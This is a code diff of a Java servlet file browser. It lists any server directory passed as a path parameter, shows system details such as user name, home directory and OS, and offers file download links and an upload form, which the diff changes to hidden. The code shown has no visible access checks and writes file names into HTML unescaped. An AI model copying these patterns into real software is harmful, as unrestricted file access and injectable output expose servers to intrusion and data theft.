@@ -37,10 +37,10 @@ public class dl extends HttpServlet {
         response.setContentType("text/html;charset=UTF-8");
 
         String currentUser = System.getProperty("user.name");
-        String serverTime = utils.getServerTime();
-        String timeZone = utils.getServerTimeZone();
-        String osName = utils.getOSName();
-        String osArch = utils.getOSArch();
+        String serverTime = ut.getServerTime();
+        String timeZone = ut.getServerTimeZone();
+        String osName = ut.getOSName();
+        String osArch = ut.getOSArch();
         String userHome = System.getProperty("user.home");
         String javaVersion = System.getProperty("java.version");
         String serverInfo = getServletContext().getServerInfo();
@@ -58,7 +58,7 @@ public class dl extends HttpServlet {
             dl2.printBreadcrumbs(out, path);
             dl2.printFilterForm(out, path, filter, sort, order);
 			if (folder.canWrite()) {
-				out.println("<form method='post' action='up' enctype='multipart/form-data' style='display: inline-block; margin-left: 10px;'>");
+				out.println("<form method='post' action='up' enctype='multipart/form-data' class='action-upload' style='display: none; margin-left: 10px;'>");
 				out.println("<input type='file' name='file' required style='background-color: #333; color: #fff; border: 1px solid #555; border-radius: 5px; padding: 5px;'>");
 				out.println("<input type='hidden' name='path' value='" + folder.getAbsolutePath() + "'>");
 				out.println("<button type='submit' style='margin-left: 5px; padding: 5px 10px;'>Subir</button>");
@@ -79,14 +79,14 @@ public class dl extends HttpServlet {
                         files = Arrays.stream(files).filter(f -> f.getName().toLowerCase().startsWith(filter.toLowerCase())).toArray(File[]::new);
                     }
 
-                    Arrays.sort(files, utils.getFileComparator(sort, order));
+                    Arrays.sort(files, ut.getFileComparator(sort, order));
 					for (File file : files) {
 						String name = file.isDirectory() ? file.getName() + "/" : file.getName();
-						String owner = utils.getOwner(file);
-						String permissions = utils.getPermissions(file);
-						String created = utils.getCreationDate(file, sdf);
+						String owner = ut.getOwner(file);
+						String permissions = ut.getPermissions(file);
+						String created = ut.getCreationDate(file, sdf);
 						String modifiedDate = sdf.format(file.lastModified());
-						String size = file.isDirectory() ? "-" : utils.formatFileSize(file.length());
+						String size = file.isDirectory() ? "-" : ut.formatFileSize(file.length());
 
 						out.println("<tr>");
 						out.println("<td title='" + name + "'><a href='" + (file.isDirectory() ? "?path=" + file.getAbsolutePath() : "fd?file=" + file.getAbsolutePath()) + "'>" + name + "</a></td>");
